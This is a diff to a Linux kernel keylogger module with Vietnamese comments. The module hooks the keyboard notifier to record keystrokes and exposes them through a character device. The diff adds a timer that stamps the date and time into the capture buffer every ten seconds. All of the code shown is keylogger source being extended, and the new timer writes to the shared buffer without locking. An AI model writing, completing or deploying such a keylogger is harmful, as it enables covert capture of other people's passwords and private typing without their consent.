@@ -14,10 +14,14 @@
 #include <linux/file.h>
 #include <linux/keyboard.h>
 #include <linux/input.h>
+#include <linux/timekeeping.h>
+#include <linux/jiffies.h>
+#include <linux/time64.h>
 
 #define DEVICE_NAME "keylogger"
 #define BUF_SIZE 1024
-#define MAX_PENDING_CHARS 16 // Đủ dài cho tổ hợp phím như [Ctrl+Alt+Del]
+#define MAX_PENDING_CHARS 32 // Đủ dài cho tổ hợp phím như [Ctrl+Alt+Del]
+#define TIME_LOG_INTERVAL (10 * HZ)
 
 static dev_t dev_num;
 static struct cdev keylogger_cdev;
@@ -41,6 +45,9 @@ static bool right_ctrl_pressed = false;
 static bool left_alt_pressed = false;
 static bool right_alt_pressed = false;
 static bool caps_lock_active = false;
+
+// Timer để ghi thời gian
+static struct timer_list time_log_timer;
 
 struct key_map {
     int keycode;
@@ -114,6 +121,28 @@ static const struct key_map keymap[] = {
     {0, NULL, 0, 0, 0} // Kết thúc bảng
 };
 
+static void time_log_func(struct timer_list *t) {
+    struct timespec64 ts;
+    struct tm tm;
+    char time_str[32];
+
+    printk(KERN_DEBUG "Time log function called\n"); // Debug
+    ktime_get_real_ts64(&ts);
+    time64_to_tm(ts.tv_sec, 0, &tm);
+    snprintf(time_str, sizeof(time_str), "[%04ld-%02d-%02d %02d:%02d:%02d]\n",
+             tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
+             tm.tm_hour, tm.tm_min, tm.tm_sec);
+
+    pending_count = 0;
+    for (int i = 0; time_str[i] && pending_count < MAX_PENDING_CHARS - 1; i++) {
+        pending_key[pending_count++] = time_str[i];
+    }
+    pending_key[pending_count] = '\0';
+
+    printk(KERN_DEBUG "Scheduling time log: %s\n", pending_key); // Debug
+    schedule_work(&keylogger_work);
+    mod_timer(&time_log_timer, jiffies + TIME_LOG_INTERVAL);
+}
 // Ham chuyen doi keycode thanh chuoi, luu vao pending_key[]
 static void set_pending_key(int keycode) {
 // trang thai phim shift chung
@@ -313,6 +342,10 @@ static int __init keylogger_init(void) {
     INIT_WORK(&keylogger_work, keylogger_work_func);
     spin_lock_init(&buf_lock);
 
+    // Khởi tạo timer để ghi thời gian
+    timer_setup(&time_log_timer, time_log_func, 0);
+    mod_timer(&time_log_timer, jiffies + TIME_LOG_INTERVAL);
+
     ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
     if (ret < 0) {
         printk(KERN_ERR "Failed to allocate character device region: %d\n", ret);
@@ -341,7 +374,7 @@ static int __init keylogger_init(void) {
         goto destroy_device;
     }
 
-    printk(KERN_INFO "Keylogger loaded (keyboard_notifier).\n");
+    printk(KERN_INFO "Keylogger loaded (keyboard_notifier + time_logging).\n");
     return 0;
 
 destroy_device:
@@ -350,11 +383,13 @@ destroy_device:
 del_cdev:
     cdev_del(&keylogger_cdev);
 unregister:
+    del_timer_sync(&time_log_timer);
     unregister_chrdev_region(dev_num, 1);
     return ret;
 }
 
 static void __exit keylogger_exit(void) {
+    del_timer_sync(&time_log_timer);
     unregister_keyboard_notifier(&nb);
     flush_work(&keylogger_work);
     device_destroy(keylogger_class, dev_num);
